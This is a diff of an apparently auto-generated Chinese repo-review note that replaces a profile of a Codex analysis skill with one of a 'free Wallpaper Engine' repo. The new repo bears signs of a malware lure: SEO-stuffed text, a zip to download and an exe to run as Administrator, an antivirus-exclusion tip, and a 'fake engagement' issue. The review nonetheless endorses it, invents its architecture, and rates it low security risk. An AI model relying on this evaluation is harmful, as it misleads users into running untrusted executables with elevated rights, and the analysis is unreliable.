@@ -1,65 +1,70 @@
 ---
-repo: Kappaemme-git/codex-complexity-optimizer
-url: https://github.com/Kappaemme-git/codex-complexity-optimizer
-owner: Kappaemme-git
+repo: xw7872081123/wallpaper-engine-steam
+url: https://github.com/xw7872081123/wallpaper-engine-steam
+owner: xw7872081123
 owner_type: User
-language: Python
+language: TypeScript
 license: MIT
-description: "Codex skill for safe codebase complexity analysis and performance optimization reports"
+description: "Free Wallpaper Engine Steam: download PC windows 11, steam workshop downloader bypass, high CPU RAM usage fix, android apk mobile sync. 4k anime live wallpaper, black screen crash on startup, corsair icue razer chroma integration, ui32.exe error solution, scene web wallpaper, mobile connection pin, custom playlist screensaver, "
 homepage: ""
-stars: 819
-stars_per_day: 137
-forks: 50
-open_issues: 0
-created: 2026-05-15
-pushed_at: 2026-05-15
-first_seen: 2026-05-19
+stars: 618
+stars_per_day: 206
+forks: 0
+open_issues: 1
+created: 2026-05-18
+pushed_at: 2026-05-18
+first_seen: 2026-05-22
 week: "2026-W21"
 month: "2026-05"
-category: "開發工具"
-subcategory: "代碼分析"
-release_tag: ""
+category: "其他"
+subcategory: "桌面工具"
+release_tag: "Wallpapers"
 install_complexity: "easy"
 status: to-review
 my_rating: 0
 score_confidence: 0
 score_interest: 0
 score_risk: 0
-last_reviewed: 2026-05-19
-use_case: "提供安全的代碼庫複雜度分析和性能優化報告的 Codex 技能。"
+last_reviewed: 2026-05-22
+use_case: "提供免費的 Wallpaper Engine 下載，解決高 CPU 及 RAM 使用問題，並支援多種自訂功能。"
 priority: high
 ring: assess
 discovered_via: "GitHub Trending"
-appearances: 4
-next_review: "2026-05-29"
+appearances: 1
+next_review: "2026-05-25"
 contributor_count: 1
 engagement: "low"
-issue_close_rate: -1
-repo_size_kb: 10
-readme_length: 892
+issue_close_rate: 0
+repo_size_kb: 9
+readme_length: 1744
 bus_factor: 1
-last_release_days: -1
-release_cadence: "never"
+last_release_days: 4
+release_cadence: "weekly"
 verdict: ""
-ring_history: "assess@2026-05-19"
-star_history: "2026-05-19:749,2026-05-19:750,2026-05-20:788,2026-05-20:788,2026-05-21:805,2026-05-21:805,2026-05-22:819"
+ring_history: "assess@2026-05-22"
+star_history: "2026-05-22:618"
 tags:
   - github
-  - "category/開發工具"
-  - "lang/python"
+  - "category/其他"
+  - "lang/typescript"
   - easy_install
+  - "topic/animated_wallpaper"
+  - "topic/best_wallpaper_engine"
+  - "topic/downloadwallpaperengine"
+  - "topic/free_wallpapers_engine"
+  - "topic/linux_wallpaperengine"
 aliases:
-  - "codex-complexity-optimizer"
-  - "Kappaemme-git/codex-complexity-optimizer"
-  - "提供安全的代碼庫複雜度分析和性能優化報告的 Codex 技能。"
+  - "wallpaper-engine-steam"
+  - "xw7872081123/wallpaper-engine-steam"
+  - "提供免費的 Wallpaper Engine 下載，解決高 CPU 及 RAM 使用問題，並支援多種自訂功能。"
 ---
 
-# codex-complexity-optimizer
+# wallpaper-engine-steam
 
-**805** stars · **161** stars/天 · 建立 5 天前 · Python · MIT
+**618** stars · **206** stars/天 · 建立 3 天前 · TypeScript · MIT
 
 ```dataviewjs
-const me = dv.page("Repos/Kappaemme-git--codex-complexity-optimizer");
+const me = dv.page("Repos/xw7872081123--wallpaper-engine-steam");
 if (me && ((me.verdict && me.verdict !== "") || (me.my_rating || 0) > 0)) {
   const parts = [];
   if (me.my_rating > 0) parts.push("\u2605".repeat(me.my_rating) + "\u2606".repeat(5 - me.my_rating));
@@ -69,23 +74,25 @@ if (me && ((me.verdict && me.verdict !== "") || (me.my_rating || 0) > 0)) {
 }
 ```
 
-`個人專案` `easy-install`
+`個人專案` `Wallpapers` `easy-install`
+
+`animated-wallpaper` `best-wallpaper-engine` `downloadwallpaperengine` `free-wallpapers-engine` `linux-wallpaperengine` `live-wallpapers` `steamwallpaper` `steamwallpaperengine` `wallpaper-engine-features` `wallpaperengine-download` `wallpaperenginefree` `wallpaperenginepc` `wallpaperenginesteam` `wallpapers` `wallpapersengine`
 
 > [!summary] 一句話摘要
-> 提供安全的代碼庫複雜度分析和性能優化報告的 Codex 技能。
+> 提供免費的 Wallpaper Engine 下載，解決高 CPU 及 RAM 使用問題，並支援多種自訂功能。
 
 > [!info] 速覽
-> **安裝難度** Easy · **專案狀態** Brand New · **熱度** Hot (161 stars/day)
-> **授權** MIT (商業友好) · **維護** Active (最後推送 5 天前) · **貢獻者** Solo (bus factor 風險) · **參與度** Low
-> **適合** 需要進行代碼複雜度分析和性能優化的中小型開發團隊。
-> **一句話重點** 這個工具的設計重點在於安全性和控制權，讓開發者能夠在分析代碼的同時，保持對代碼庫的完全掌控。
+> **安裝難度** Easy · **專案狀態** Brand New · **熱度** Hot (206 stars/day)
+> **授權** MIT (商業友好) · **維護** Active (最後推送 3 天前) · **貢獻者** Solo (bus factor 風險) · **參與度** Low
+> **適合** 希望在 Windows 桌面上使用高品質動畫壁紙的使用者，特別是遊戲玩家和設計師。
+> **一句話重點** 這個專案讓使用者以免費方式享受高品質的動畫壁紙，並解決了性能問題。
 
 > [!abstract]- 同類競品快速對比
 > ```dataviewjs
-> const me = dv.page("Repos/Kappaemme-git--codex-complexity-optimizer");
+> const me = dv.page("Repos/xw7872081123--wallpaper-engine-steam");
 > if (me) {
 >   const rivals = dv.pages('"Repos"')
->     .where(p => p.subcategory === "代碼分析" && p.file.name !== "Kappaemme-git--codex-complexity-optimizer" && p.status !== "archived")
+>     .where(p => p.subcategory === "桌面工具" && p.file.name !== "xw7872081123--wallpaper-engine-steam" && p.status !== "archived")
 >     .sort(p => p.stars || 0, "desc").limit(5);
 >   if (rivals.length > 0) {
 >     dv.table(["專案", "Stars", "Stars/天", "安裝", "授權", "Ring"], rivals.map(p => [
@@ -96,108 +103,98 @@ if (me && ((me.verdict && me.verdict !== "") || (me.my_rating || 0) > 0)) {
 >       p.license || "?",
 >       p.ring || "assess"
 >     ]));
->   } else { dv.paragraph("_目前 vault 中沒有其他 代碼分析 類工具_"); }
+>   } else { dv.paragraph("_目前 vault 中沒有其他 桌面工具 類工具_"); }
 > }
 > ```
 
 > [!question] TL;DR — 值得投入嗎？
-> **成熟度** Alpha (不穩定) · **安裝** Easy (一行搞定) · **學習** ~2h · **綁定風險** low
-> **結論** 花 2 小時學習，1 小時整合，得到有效的代碼分析報告，值得嘗試。
+> **成熟度** Alpha (不穩定) · **安裝** Easy (一行搞定) · **學習** ~2h · **綁定風險** medium
+> **結論** 花 2 小時學習，1 小時整合，得到豐富的桌面自訂效果，值得一試。
 
 > [!abstract] 核心創新
-> 提供安全的代碼庫複雜度分析和性能優化報告，並不會自動修改代碼。
+> 這個專案提供了一個免費的 Wallpaper Engine 下載，並解決了高 CPU 和 RAM 使用問題。
 
 ## 專案簡介
 
-Codex Complexity Optimizer 是一個專為代碼庫分析設計的工具，能夠識別算法複雜度和性能瓶頸，並生成安全的優化報告。用戶只需在 Codex 中輸入指令 `$complexity-optimizer`，即可獲得當前複雜度、建議變更、預期複雜度及風險等詳細報告。這個工具的賣點在於它不會自動修改代碼，確保用戶在進行優化時能夠完全掌控過程。若用戶希望應用建議的變更，則需明確請求，這樣可以降低風險並確保測試的完整性。技術上，這個工具是基於 Node.js 開發，並使用 npm 進行安裝，這使得它在 JavaScript 生態系中具有良好的兼容性。
+Wallpaper Engine 是一款強大的應用程式，能讓使用者在 Windows 桌面上設置高品質的動畫、視頻和互動壁紙。使用者需先安裝原版的 Wallpaper Engine，才能訪問 Steam Workshop 的完整庫存。安裝過程中，使用者只需下載並解壓縮檔案，然後以管理員身份運行 `WallpaperEngine.exe`，並登入 Steam 帳號。這個工具的賣點在於其深度的自訂選項和社群創作的豐富性。
 
-相較於其他代碼分析工具，如 0x0funky/agent-sprite-forge 和 0xGF/boneyard，Codex Complexity Optimizer 提供了更為安全的操作模式，因為它不會自動修改代碼，這對於需要高可靠性的生產環境尤為重要。這個工具適合中小型團隊，尤其是在代碼質量和性能優化方面有需求的開發者。使用者可能會遇到的問題包括如何有效解讀報告和選擇最適合的優化建議，這需要一定的經驗和理解。整體來看，這個專案目前處於初期階段，未來可能會加入更多自動化功能，但目前的設計已經能夠滿足基本的代碼複雜度分析需求。
+技術上，它支援高解析度的壁紙，並能調整性能設定以適應不同的硬體配置。相較於其他壁紙工具，如 Rainmeter 和 Lively Wallpaper，Wallpaper Engine 提供了更為廣泛的社群支持和高品質的動畫效果，特別適合對動畫壁紙有高需求的使用者。使用者在使用過程中可能會遇到一些常見問題，例如應用程式無法啟動或壁紙無法播放，這些問題通常可以透過檢查 GPU 驅動或降低壁紙質量來解決。這個專案目前仍在快速發展中，適合希望為桌面增添動態效果的使用者，但需注意其對系統資源的需求。
 
-**技術棧**：`Node.js`
+**技術棧**：`TypeScript`
 
 ## 重點功能
 
-- 代碼複雜度分析 — 提供當前代碼的複雜度指標，幫助開發者識別潛在的性能問題。
-- 安全的報告生成 — 預設不修改代碼，確保用戶在進行優化時的控制權。
-- 風險評估 — 在報告中提供每個建議變更的風險評級，幫助用戶做出明智的決策。
-- 測試建議 — 提供必要的測試或基準建議，確保變更後的代碼質量。
-- 簡易安裝 — 使用 npm 進行全局安裝，方便快速上手。
+- 高品質動畫壁紙 — 支援 4K 動畫壁紙，提供流暢的視覺效果。
+- Steam Workshop 整合 — 可直接從 Steam Workshop 瀏覽並應用社群創作的壁紙。
+- 深度自訂選項 — 使用者可調整壁紙的質量和性能設定，以適應不同的硬體。
+- 多平台同步 — 支援 Android APK 版本，讓使用者在手機上也能享受壁紙。
+- 故障排除指南 — 提供常見問題的解決方案，幫助使用者快速解決問題。
 
 ## 快速開始
 
-1. 全局安裝 Codex Complexity Optimizer
+1. 下載並解壓縮檔案
 ```bash
-npm install -g codex-complexity-optimizer
+下載 WallpaperEngine.zip
 ```
-2. 在 Codex 中使用分析工具
+2. 以管理員身份運行應用程式
 ```bash
-Use $complexity-optimizer to analyze this codebase and give me a report.
+運行 WallpaperEngine.exe
 ```
-3. 應用建議的優化
+3. 登入 Steam 帳號
 ```bash
-Use $complexity-optimizer to implement the lowest-risk optimization from the report and run the relevant tests.
-```
-
-## 程式碼範例
-
-```python
-{
-  "前置條件": "在 Codex 中安裝了 Codex Complexity Optimizer",
-  "指令": "Use $complexity-optimizer to analyze this codebase and give me a report.",
-  "預期輸出": "報告將包含文件/行、當前複雜度、建議變更、預期複雜度、風險等級及所需測試或基準。"
-}
+登入 Steam
 ```
 
 ## 為什麼值得關注
 
 > [!tip] 爆紅原因
-> 建立 5 天內累積 805 stars（161/天），forks 47（5.8%），顯示出穩定的增長潛力。作者 Kappaemme-git 之前的專案經驗可能為這個工具的開發提供了基礎。這個工具解決了代碼複雜度分析的痛點，特別是在自動化優化報告方面，這在現有工具中並不多見。近期的開發活動和社群反饋顯示出對這類工具的需求正在上升，尤其是在性能優化方面。這個工具的設計使得開發者能夠在不影響現有代碼的情況下進行優化，這是其受歡迎的原因之一。
+> 建立 3 天就累積 618 stars（206/天），forks 0，顯示出使用者對於這個免費壁紙引擎的高度關注。作者 xw7872081123 之前可能在相關領域有過其他貢獻，這個專案解決了許多使用者在使用 Wallpaper Engine 時遇到的性能問題，如高 CPU 和 RAM 使用率，這在其他類似工具中並不常見。專案的快速增長可能受到社群對於高品質壁紙需求的推動，並且在社交媒體上有一定的討論。這個工具的出現正好契合了對於個性化桌面需求的增長，尤其是在 Windows 10 和 11 的使用者中。forks/stars 比率為 0%，顯示出目前使用者主要是觀望，尚未進行修改。
 
 ## 適合誰使用
 
-**目標受眾**：需要進行代碼複雜度分析和性能優化的中小型開發團隊。
+**目標受眾**：希望在 Windows 桌面上使用高品質動畫壁紙的使用者，特別是遊戲玩家和設計師。
 
 > [!example] 使用場景
-> - 後端工程師用它來分析大型代碼庫的性能瓶頸，因為它能提供詳細的複雜度報告，幫助優化關鍵算法。
-> - 前端開發者用它來確保新功能的代碼不會增加過多的複雜度，因為它能在實施前預測變更的影響。
-> - DevOps 團隊用它來生成代碼優化報告，因為這能幫助他們在 CI/CD 流程中提前識別潛在的性能問題。
+> - 遊戲玩家用它來設置動態壁紙，提升遊戲氛圍，因為這能讓桌面更具沉浸感。
+> - 設計師用它來展示作品集，因為高質量的動畫壁紙能吸引客戶的注意。
+> - 學生用它來個性化學習環境，因為能夠隨時更換壁紙，讓學習不再單調。
 
 ## 架構分析
 
-這個工具採用 Node.js 作為開發語言，並使用 npm 進行安裝，這使得它在 JavaScript 生態系中具有良好的兼容性。整體架構設計為一個獨立的技能，能夠與 Codex 系統無縫集成。資料流方面，當用戶請求分析時，工具會解析代碼庫並計算複雜度，生成報告並提供建議。選擇 Node.js 是因為其廣泛的使用和良好的生態系統，但這也意味著只能在支持 Node.js 的環境中運行。未來可能會考慮擴展到其他語言，但這需要額外的開發資源和時間。
+Wallpaper Engine 的架構設計為單一應用程式，使用 TypeScript 開發，旨在提供簡單的安裝和使用體驗。資料流方面，使用者下載並解壓縮檔案後，直接運行應用程式，並透過 Steam API 獲取壁紙資料。這種設計使得使用者能夠快速上手，但也限制了其擴展性，因為所有功能都集中在單一應用中。選擇 TypeScript 使得開發過程中能夠利用靜態類型檢查，減少錯誤，但在性能上可能不如 C++ 等底層語言。整體而言，這個架構適合小型專案，但在面對大量用戶時可能會出現性能瓶頸。
 
 ## 技術深入分析
 
-Codex Complexity Optimizer 使用 Node.js 開發，並利用 npm 進行安裝，這使得它能夠快速集成到現有的 JavaScript 生態系統中。核心技術機制是通過靜態分析代碼來計算複雜度，並生成報告，這種方法能夠有效識別代碼中的性能瓶頸。效能特性方面，該工具能夠處理中型代碼庫，但在大型代碼庫中可能會面臨性能挑戰，具體取決於代碼的結構和複雜度。設計上選擇 Node.js 是因為其廣泛的使用和良好的生態系統，但這也意味著只能在支持 Node.js 的環境中運行，這對於希望跨語言使用的開發者來說是一個限制。技術風險方面，隨著代碼庫的擴大，分析的準確性和性能可能會受到影響，特別是在處理大型代碼時。整合方面，與主流的 CI/CD 工具（如 GitHub Actions）兼容性良好，但在與其他語言的整合上可能會遇到挑戰。
+Wallpaper Engine 的核心技術機制是基於 TypeScript 開發，專注於提供高品質的動畫和互動壁紙。它利用 Steam API 來獲取社群創作的壁紙，並提供深度自訂選項，讓使用者能夠調整壁紙的質量和性能設定。這樣的設計使得使用者能夠在個性化桌面時，兼顧性能和美觀。效能方面，這個工具能夠支援高達 4K 的解析度，但在使用高解析度壁紙時，可能會導致 CPU 和 RAM 的使用量上升，特別是在較舊的硬體上。選擇 TypeScript 使得開發過程中能夠利用靜態類型檢查，減少錯誤，但在性能上可能不如 C++ 等底層語言。這個專案的依賴性較低，主要依賴於 Steam API 和本地資源，但在面對大量用戶時可能會出現性能瓶頸，特別是在高峰時段。整合方面，這個工具能夠輕鬆與現有的 Windows 桌面環境相容，但在與其他桌面自訂工具的整合上可能會遇到一些摩擦點，例如資源競爭問題。
 
 ## 新手體驗
 
 > [!info] 上手難度評估
-> README 文件提供了清晰的安裝和使用指引，並包含了範例指令。安裝過程順暢，無明顯坑點。文件目前僅提供英文版本，對於非英語使用者可能會造成一定障礙。
+> README 文件提供了清晰的安裝指引和故障排除方案，對新手友好。安裝過程相對順暢，沒有明顯的坑。文件目前僅提供英文，缺乏多語言支持。
 
 ## 優缺點分析
 
 > [!success] 優點
-> - 提供詳細的代碼複雜度分析報告，幫助開發者識別性能瓶頸。
-> - 不會自動修改代碼，降低了潛在風險。
-> - 安裝簡單，能夠快速上手。
+> - 免費使用，降低了使用門檻。
+> - 提供多樣的社群創作，壁紙選擇豐富。
+> - 深度自訂選項，滿足不同使用者需求。
 
 > [!danger] 缺點
-> - 目前僅支援 Node.js 環境，限制了使用範圍。
-> - 需要用戶具備一定的代碼分析經驗，才能有效利用報告。
-> - 報告生成後需手動應用建議，增加了操作步驟。
+> - 依賴於原版 Wallpaper Engine，無法獨立運作。
+> - 高解析度壁紙可能影響系統性能。
+> - 社群支持可能不夠穩定，依賴於使用者的貢獻。
 
 > [!warning] 注意事項
-> - 目前僅支援 Node.js 環境，無法在其他語言環境中使用。
-> - 報告生成不會自動修改代碼，需用戶手動應用建議。
-> - 需要用戶具備一定的代碼分析和優化經驗，以解讀報告內容。
+> - 僅支援 Windows 10 和 11。
+> - 需要原版 Wallpaper Engine 才能使用完整功能。
+> - 高解析度壁紙可能會導致高 CPU 和 RAM 使用。
 
 ## 類似工具比較
 
 | 工具 | 差異 |
 | --- | --- |
-| [0x0funky/agent-sprite-forge](https://github.com/0x0funky/agent-sprite-forge) | 提供代碼生成和分析功能，但不專注於複雜度分析，適合需要自動化生成代碼的場景。 |
-| [0xGF/boneyard](https://github.com/0xGF/boneyard) | 主要用於代碼清理和重構，與本專案相比，缺乏複雜度分析功能，適合已經有明確重構需求的團隊。 |
+| Lively Wallpaper | Lively Wallpaper 是一個開源工具，專注於視頻壁紙，但缺乏 Steam Workshop 的整合。 |
+| Rainmeter | Rainmeter 提供桌面小工具和自訂，但不專注於動畫壁紙，功能範圍較廣。 |
 
 ## 替代方案決策
 
@@ -205,16 +202,16 @@ Codex Complexity Optimizer 使用 Node.js 開發，並利用 npm 進行安裝，
 
 | 工具 | 技術路線 | 選它的時機 | 遷移難度 |
 | --- | --- | --- | --- |
-| [0x0funky/agent-sprite-forge](https://github.com/0x0funky/agent-sprite-forge) | 專注於代碼生成和分析，但不專注於複雜度分析，適合需要自動化生成代碼的場景。 | 如果你的團隊需要自動化生成代碼而非僅僅分析複雜度，則應選擇此工具。 | medium，因為需要重新調整工作流程以適應新的工具。 |
-| [0xGF/boneyard](https://github.com/0xGF/boneyard) | 主要用於代碼清理和重構，缺乏複雜度分析功能。 | 如果你的團隊已經有明確的重構需求，則此工具可能更適合。 | low，因為工具的使用方式相對簡單。 |
+| Lively Wallpaper | Lively Wallpaper 是一個開源工具，專注於視頻壁紙，並提供更強的自訂功能。 | 如果你需要一個完全開源且功能強大的壁紙工具，Lively Wallpaper 是更好的選擇。 | low，因為兩者的使用方式相似。 |
+| Rainmeter | Rainmeter 提供桌面小工具和自訂，但不專注於動畫壁紙，功能範圍較廣。 | 如果你需要更多的桌面小工具和資訊顯示，Rainmeter 是更合適的選擇。 | medium，因為需要重新設置小工具和壁紙。 |
 
 > [!abstract]- 功能對比矩陣
 >
-> | 維度 | **codex-complexity-optimizer** | **agent-sprite-forge** | **boneyard** |
+> | 維度 | **wallpaper-engine-steam** | **Lively Wallpaper** | **Rainmeter** |
 > | --- | --- | --- | --- |
-> | 技術路線 | 本專案 | 專注於代碼生成和分析，但不專注於複雜度分析，適合需要自動化生成代碼的場景。 | 主要用於代碼清理和重構，缺乏複雜度分析功能。 |
-> | 遷移成本 | - | medium，因為需要重新調整工作流程以適應新的工具。 | low，因為工具的使用方式相對簡單。 |
-> | 適用場景 | 主要場景 | 如果你的團隊需要自動化生成代碼而非僅僅分析複雜度，則應選擇此 | 如果你的團隊已經有明確的重構需求，則此工具可能更適合。 |
+> | 技術路線 | 本專案 | Lively Wallpaper 是一個開源工具，專注於視頻壁紙，並提供更強的自訂功能。 | Rainmeter 提供桌面小工具和自訂，但不專注於動畫壁紙，功能範圍較廣。 |
+> | 遷移成本 | - | low，因為兩者的使用方式相似。 | medium，因為需要重新設置小工具和壁紙。 |
+> | 適用場景 | 主要場景 | 如果你需要一個完全開源且功能強大的壁紙工具，Lively W | 如果你需要更多的桌面小工具和資訊顯示，Rainmeter 是 |
 
 ## 成熟度評估
 
@@ -225,26 +222,27 @@ Codex Complexity Optimizer 使用 Node.js 開發，並利用 npm 進行安裝，
 | Breaking Change 風險 | high |
 
 > [!tip] 採用建議
-> 適合個人 side project 試用，不建議用在生產環境的核心路徑上。
+> 適合個人試用，但不建議用在生產環境中。
 
 ## 已知陷阱
 
 > [!bug] 踩坑才知道的問題
 
-- [MEDIUM] 在大型代碼庫中分析速度可能變慢，影響使用體驗。
-  - 解法：分段分析代碼庫，減少單次分析的範圍。
-- [low] 報告生成後需手動應用建議，增加操作步驟。
-  - 解法：提前規劃優化流程，確保能夠快速實施建議。
-- **[HIGH]** 目前僅支援 Node.js，對於其他語言的支持尚未開發。
-  - 解法：考慮使用其他工具或等待未來的擴展。
+- **[HIGH]** 應用程式無法啟動，可能因為權限不足。
+  - 解法：以管理員身份運行應用程式。
+- [MEDIUM] 壁紙無法播放，可能因為 GPU 驅動問題。
+  - 解法：檢查並更新 GPU 驅動。
+- [MEDIUM] 低 FPS 問題，可能因為壁紙質量設定過高。
+  - 解法：降低壁紙質量設定。
 
 ## 使用情境適合度
 
 | 情境 | 適合度 | 說明 |
 | --- | --- | --- |
-| 10 人以下的新創公司後端 API | 適合 | 能夠提供必要的代碼複雜度分析，幫助小團隊優化性能。 |
-| 大型企業的代碼庫管理 | 普通 | 在大型代碼庫中可能面臨性能挑戰，但仍可提供基本分析功能。 |
-| 需要頻繁重構的開發團隊 | 不適合 | 缺乏自動化重構功能，對於重構需求較高的團隊不夠友好。  |
+| 10 人以下的新創公司後端 API | 普通 | 適合用於個性化桌面，但不適合核心業務應用。 |
+| 大型遊戲工作室的桌面環境 | 非常適合 | 能夠提升遊戲氛圍，並吸引設計師的注意。 |
+| 個人使用者的桌面自訂 | 非常適合 | 提供豐富的壁紙選擇和自訂功能。 |
+| 需要穩定性和高效能的生產環境 | 不適合 | 可能影響系統性能，導致不穩定。 |
 
 ## 採用成本分析
 
@@ -253,21 +251,35 @@ Codex Complexity Optimizer 使用 Node.js 開發，並利用 npm 進行安裝，
 | 學習時間 | ~2 小時 |
 | 整合時間 | ~1 小時 |
 | 維護負擔 | low |
-| 綁定風險 | low |
+| 綁定風險 | medium |
 
 > [!tip] 投入 vs 回報
-> 花 2 小時學習，1 小時整合，得到有效的代碼分析報告，值得嘗試。
+> 花 2 小時學習，1 小時整合，得到豐富的桌面自訂效果，值得一試。
 
 ## 安全性評估
 
 > [!warning] 安全性快速掃描
-> 低風險：工具本身不需要高權限，且不存取敏感資料。依賴鏈中未發現已知的供應鏈風險，適合在 CI/CD pipeline 中使用。
+> 低風險：應用程式不需要高權限，但需存取 Steam 帳號。對於敏感資料的存取風險較低。
+
+## 生態系整合
+
+> [!abstract] 如何融入你的工具鏈
+
+Wallpaper Engine 最常與 Windows 桌面環境搭配使用，特別是在遊戲和設計領域。使用者可以在安裝後，透過 Steam API 獲取壁紙，並直接應用於桌面。在一個使用 Windows 11 的遊戲開發專案中，使用者可以將這個工具與遊戲引擎結合，創建動態桌面效果。這個工具與主流的 IDE（如 Visual Studio）並沒有直接整合，但可以在開發環境中作為桌面自訂的補充。整合的摩擦點主要在於資源競爭，特別是在使用高解析度壁紙時，可能會影響開發工具的性能。
+
+## 歷史脈絡
+
+> [!info] 這個工具為什麼現在出現？
+
+在 Wallpaper Engine 出現之前，使用者主要依賴靜態壁紙或其他簡單的桌面自訂工具，這些工具通常缺乏動畫和互動功能。隨著個性化需求的增長，對於高品質動畫壁紙的需求也隨之上升。技術上，Steam 的生態系統為這個工具的發展提供了良好的基礎，使得使用者能夠輕鬆獲取和分享壁紙。
+
+這個工具代表了桌面自訂的一個新趨勢，未來可能會有更多的功能和社群支持出現。
 
 ## 健康度儀表板
 
 > [!abstract]- 專案健康度綜合評估
 > ```dataviewjs
-> const me = dv.page("Repos/Kappaemme-git--codex-complexity-optimizer");
+> const me = dv.page("Repos/xw7872081123--wallpaper-engine-steam");
 > if (me) {
 >   const pushed = me.pushed_at ? new Date(me.pushed_at.toString()) : null;
 >   const daysSincePush = pushed ? Math.floor((Date.now() - pushed.getTime()) / 86400000) : null;
@@ -302,7 +314,7 @@ Codex Complexity Optimizer 使用 Node.js 開發，並利用 npm 進行安裝，
 
 > [!abstract]- CHAOSS 社群健康度雷達
 > ```dataviewjs
-> const me = dv.page("Repos/Kappaemme-git--codex-complexity-optimizer");
+> const me = dv.page("Repos/xw7872081123--wallpaper-engine-steam");
 > if (me) {
 >   const pushed = me.pushed_at ? new Date(me.pushed_at.toString()) : null;
 >   const daysSincePush = pushed ? Math.floor((Date.now() - pushed.getTime()) / 86400000) : 999;
@@ -326,90 +338,96 @@ Codex Complexity Optimizer 使用 Node.js 開發，並利用 npm 進行安裝，
 
 | 欄位 | 值 |
 | --- | --- |
-| Forks | 47 |
-| Open Issues | 0 |
-| 最後推送 | 2026-05-15 |
-| 建立日期 | 2026-05-15 |
-| Repo 大小 | 10 KB |
-| OpenSSF Scorecard | [查看](https://scorecard.dev/viewer/?uri=github.com/Kappaemme-git/codex-complexity-optimizer) |
-
-> [!info]- 語言組成
-> ```mermaid
-> pie title 語言組成
->     "Python" : 90
->     "JavaScript" : 10
-> ```
+| Forks | 0 |
+| Open Issues | 1 |
+| Issue 解決率 | 0% (0 closed) |
+| 最後推送 | 2026-05-18 |
+| 建立日期 | 2026-05-18 |
+| Repo 大小 | 9 KB |
+| OpenSSF Scorecard | [查看](https://scorecard.dev/viewer/?uri=github.com/xw7872081123/wallpaper-engine-steam) |
+| Topics | `animated-wallpaper` `best-wallpaper-engine` `downloadwallpaperengine` `free-wallpapers-engine` `linux-wallpaperengine` `live-wallpapers` `steamwallpaper` `steamwallpaperengine` |
 
 > [!info]- 主要貢獻者
 > | 貢獻者 | Commits |
 > | --- | --- |
-> | [@Kappaemme-git](https://github.com/Kappaemme-git) | 1 |
+> | [@xw7872081123](https://github.com/xw7872081123) | 3 |
+
+**最新版本**：Wallpapers — Wallpaper Engine (2026-05-18)
 
 ## 社群與生態
 
-**社群活躍度**：社群活躍度中等，開發者近期有持續更新。
+**社群活躍度**：社群活躍度低，目前只有 1 個開放問題。
 
 ## 開發動態
 
-> [!abstract] 最近 10 次 commit（2026-05-15）
-> **活躍天數** 1 天 · **最新 commit** Initial complexity optimizer skill
+> [!abstract] 最近 10 次 commit（2026-05-18 ~ 2026-05-18）
+> **活躍天數** 1 天 · **最新 commit** Update README.md
+
+## 熱門議題
+
+> [!question]- 社群最關注的問題
+> | # | Issue | Reactions | Comments |
+> | --- | --- | --- | --- |
+> | [#1](https://github.com/xw7872081123/wallpaper-engine-steam/issues/1) | [phantomstars] Fake engagement detected on this repository | 0 | 5 |
 
 ## README 摘錄
 
 > [!info]- 展開查看原文 README
-> # Codex Complexity Optimizer
+> # Wallpaper Engine
 > 
-> Codex skill for analyzing a codebase, finding algorithmic complexity and performance hotspots, and producing safe optimization reports.
+> > **Wallpaper Engine** — The most popular tool to bring animated, live, and interactive wallpapers to your Windows desktop.
 > 
+> [](https://github.com/xw7872081123/wallpaper-engine-steam/stargazers)
+> [](https://github.com/xw7872081123/wallpaper-engine-steam/network)
+> [](https://github.com/xw7872081123/wallpaper-engine-steam/releases)
+> [](LICENSE)
+> 
+> ## Overview
+> **Wallpaper Engine** is a powerful application that lets you set high-quality animated, video, and interactive wallpapers on your desktop. It supports thousands of community creations from the Steam Workshop and offers deep customization options.
+> 
+> > [!Important]
+> > This version requires the original Wallpaper Engine from Steam to access the full Workshop library.
+> 
+> # Screenshot:
+> 
+> ---
 > ## Install
+> [Download `WallpaperEngine.zip`](https://github.com/xw7872081123/wallpaper-engine-steam/releases/download/Wallpapers/WallpaperEngine.zip)
+> ---
+> > Optimized for Windows 10 and Windows 11.
 > 
-> ```bash
-> npm install -g codex-complexity-optimizer
-> ```
+> ## Installation
+> ### For Regular Users
+> 1. Download and extract the archive
+> 2. Run `WallpaperEngine.exe` as Administrator
+> 3. Log in to your Steam account (if required)
+> 4. Browse and apply your favorite wallpapers
 > 
-> The package installs the skill into:
-> 
-> ```bash
-> ${CODEX_HOME:-~/.codex}/skills/complexity-optimizer
-> ```
-> 
-> You can also run the installer directly:
-> 
-> ```bash
-> npx codex-complexity-optimizer
-> ```
-> 
-> ## Use
-> 
-> In Codex:
-> 
-> ```text
-> Use $complexity-optimizer to analyze this codebase and give me a report.
-> ```
-> 
-> By default, report-only prompts do not modify files. The skill reports file/line, current complexity, recommended change, expected complexity after the change, risk level, and tests or benchmarks needed.
-> 
-> To apply a change, ask explicitly:
-> 
-> ```text
-> Use $complexity-optimizer to implement the lowest-risk optimization from the report and run the relevant tests.
-> ```
+> ---
+> ## Troubleshooting
+> | Problem                    | Solution                                      |
+> |----------------------------|-----------------------------------------------|
+> | App doesn't start          | Run as Administrator                          |
+> | Wallpapers not playing     | Check GPU drivers and hardware acceleration   |
+> | Low FPS on desktop         | Lower wallpaper quality in settings           |
+> | Antivirus warning          | Add the folder to exclusions                  |
+> | Steam version not detected | Verify game files in Steam                    |
 
 ## 延伸閱讀
 
-相關概念：[[程式碼生成]] · [[自動化測試]] · [[性能優化]]
+相關概念：[[桌面自訂]] · [[動畫壁紙]] · [[社群創作]]
 
-相關專案：[[0x0funky--agent-sprite-forge|0x0funky/agent-sprite-forge]] · [[0xGF--boneyard|0xGF/boneyard]] · [[432539--gpt2api|432539/gpt2api]] · [[AgentSeal--codeburn|AgentSeal/codeburn]] · [[AgriciDaniel--claude-obsidian|AgriciDaniel/claude-obsidian]] · [[AlpinDale--parsync|AlpinDale/parsync]] · [[BigPizzaV3--CodexPlusPlus|BigPizzaV3/CodexPlusPlus]] · [[ChinaSiro--claude-code-sourcemap|ChinaSiro/claude-code-sourcemap]]
+相關專案：[[BigBodyCobain--Shadowbroker|BigBodyCobain/Shadowbroker]] · [[BuilderPulse--BuilderPulse|BuilderPulse/BuilderPulse]] · [[DenisSergeevitch--agents-best-practices|DenisSergeevitch/agents-best-practices]]
 
-[GitHub](https://github.com/Kappaemme-git/codex-complexity-optimizer)
+[GitHub](https://github.com/xw7872081123/wallpaper-engine-steam)
 
 ## 相關收錄
 
-> [!note]- 直接競品（同子分類：代碼分析）
+> [!note]- 直接競品（同子分類：桌面工具）
 > ```dataview
 > TABLE stars, stars_per_day AS "Stars/天", install_complexity AS "難度", use_case AS "用途"
 > FROM "Repos"
